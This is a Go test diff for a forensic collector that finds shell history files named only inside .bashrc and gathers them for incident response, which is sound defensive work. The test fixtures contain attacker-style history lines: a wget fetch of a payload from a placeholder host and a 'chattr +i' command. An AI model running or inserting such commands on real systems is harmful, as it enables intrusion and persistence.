@@ -565,3 +565,72 @@ func TestScanResultsStreamsFromDisk(t *testing.T) {
 		t.Error("ScanResults yielded nothing")
 	}
 }
+
+// The two-phase artifacts: a history file whose location is only named inside
+// an rc file, so it cannot be found by matching paths during the walk.
+func TestTwoPhaseHistfileCollection(t *testing.T) {
+	h := setup(t, `version: 1.0
+output_directory: /files
+artifacts:
+  -
+    collector: command
+    command: grep -E "HISTFILE=.*" %user_home%/.bashrc | sed -e 's|.*HISTFILE=||' -e 's|^~/|%user_home%/|'
+    output_directory: /%temp_directory%/files/shell
+    output_file: bash_histfile.txt
+  -
+    collector: file
+    path: /%temp_directory%/files/shell/bash_histfile.txt
+    is_file_list: true
+`)
+	h.run(t)
+
+	// alice's .bashrc says HISTFILE=~/.hidden_history -- a path no glob in the
+	// artifact mentions.
+	alice := filepath.Join(h.out, "[root]/home/alice/.hidden_history")
+	got, err := os.ReadFile(alice)
+	if err != nil {
+		t.Fatalf("alice's hidden history was not collected: %v", err)
+	}
+	if !strings.Contains(string(got), "wget http://example.invalid/payload") {
+		t.Errorf("collected the wrong content: %q", got)
+	}
+
+	// root's .bashrc points outside the home directory entirely.
+	rootHist := filepath.Join(h.out, "[root]/var/log/root_history")
+	if got, err := os.ReadFile(rootHist); err != nil {
+		t.Errorf("root's history outside the home directory was not collected: %v", err)
+	} else if !strings.Contains(string(got), "chattr +i") {
+		t.Errorf("wrong content for root's history: %q", got)
+	}
+
+	// bob's points at a file that does not exist: recorded, not fatal.
+	if _, err := os.Stat(filepath.Join(h.out, "[root]/home/bob/.no_such_history")); err == nil {
+		t.Error("collected a history file that does not exist")
+	}
+	errs, err := os.ReadFile(filepath.Join(h.out, "uacscan/errors.txt"))
+	if err != nil || !strings.Contains(string(errs), "no_such_history") {
+		t.Errorf("a missing history file was not recorded (err=%v)", err)
+	}
+}
+
+// A rc file that names no history file must not cause the phase to collect
+// something arbitrary.
+func TestTwoPhaseCollectsNothingWithoutAnAssignment(t *testing.T) {
+	h := setup(t, `version: 1.0
+output_directory: /files
+artifacts:
+  -
+    collector: command
+    command: grep -E "NOSUCHVAR=.*" %user_home%/.bashrc | sed -e 's|.*NOSUCHVAR=||' -e 's|^~/|%user_home%/|'
+    output_directory: /%temp_directory%/files/shell
+    output_file: none.txt
+  -
+    collector: file
+    path: /%temp_directory%/files/shell/none.txt
+    is_file_list: true
+`)
+	h.run(t)
+	if _, err := os.Stat(filepath.Join(h.out, "[root]")); err == nil {
+		t.Error("collected files although no assignment was found")
+	}
+}
